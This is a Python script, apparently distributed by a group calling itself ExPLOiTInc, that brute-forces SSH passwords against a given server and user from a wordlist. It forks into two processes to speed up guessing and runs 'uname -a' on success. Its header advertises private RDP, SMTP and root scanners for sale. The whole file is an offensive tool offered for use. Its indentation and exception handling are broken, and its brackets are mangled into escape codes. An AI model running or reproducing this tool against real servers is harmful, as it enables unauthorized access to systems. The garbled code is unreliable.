#!/usr/bin/python 
#SSH BruteForcer using fork to  
#split the processes and the wordlist 
#for faster results. 


#E x P L O i T I n c 
#exploitinc@yahoo.com 
#Sell Some Private Scanners Source Codes NO DEMO 
#Root Scanner - RDP Scanner - SMTP Scanner - RDP + SMTP Scanner - Auto Root Password Scanner - Mirc Scanner 
#All Scanners Linux Base Scan Full IPS RANGES A B C D Class Add me on Yahoo :- exploitinc@yahoo.com  


import sys, time, random, os 
try: 
    import pexpect, pxssh 
except(ImportError): 
    print "\nYou need the pexpect module." 
    print "http://www.noah.org/wiki/Pexpect\n" 
    sys.exit(1) 


def brute(word): 
    print "Trying:",word 
         try: 
            s = pxssh.pxssh() 
            s.login (ip, user, word, login_timeout=10) 
            s.sendline (command) 
            s.prompt() 
            print "\n",s.before 
            s.logout() 
        print "\t***91;!***93; Login Success:",user, word,"\n" 
        sys.exit(1) 
       except Exception, e: 
            #print "***91;-***93; Failed" 
        pass 
    except KeyboardInterrupt: 
        print "\n***91;-***93; Quit\n" 
        sys.exit(1) 
     
def getword(): 
    print len(words) 
    word = random.choice(words) 
    words.remove(word) 
    print len(words) 
    return word 


print "\n\t   joeroot:ExPLOiTInc sshBrute v1.1" 
print "\t----------------------------------------" 
     
if len(sys.argv) != 4: 
    print "\nUsage : ./sshbrute.py <server> <user> <wordlist>" 
    print "Eg: ./sshbrute.py 198.162.1.1 root words.txt\n" 
    sys.exit(1) 


ip = sys.argv***91;1***93; 
user = sys.argv***91;2***93; 
command = 'uname -a' 


try: 
    wordlist = open(sys.argv***91;3***93;, "r").readlines() 
    words1 = wordlist***91;:len(wordlist) / 2***93; 
    words2 = wordlist***91;len(wordlist) / 2:***93; 
except(IOError):  
      print "\n***91;-***93; Error: Check your wordlist path\n" 
      sys.exit(1) 


print "\n***91;+***93; Loaded:",len(wordlist),"words" 
print "***91;+***93; Split - Wordlist1:",len(words1),"Wordlist2:",len(words2) 
print "***91;+***93; Server:",ip 
print "***91;+***93; User:",user 
print "***91;+***93; BruteForcing...\n" 


pid = os.fork() 
if pid: 
    print "***91;+***93; pid Started:",os.getpid(),"\n" 
    while len(words1) != 0: 
        word = random.choice(words1) 
        #Change this time if needed 
        time.sleep(0.5) 
        brute(word.replace("\n","")) 
        words1.remove(word) 
else: 
    print "***91;+***93; pid Started:",os.getpid() 
    while len(words2) != 0: 
        word = random.choice(words2) 
        #Change this time if needed 
        time.sleep(0.2) 
        brute(word.replace("\n","")) 
        words2.remove(word) 
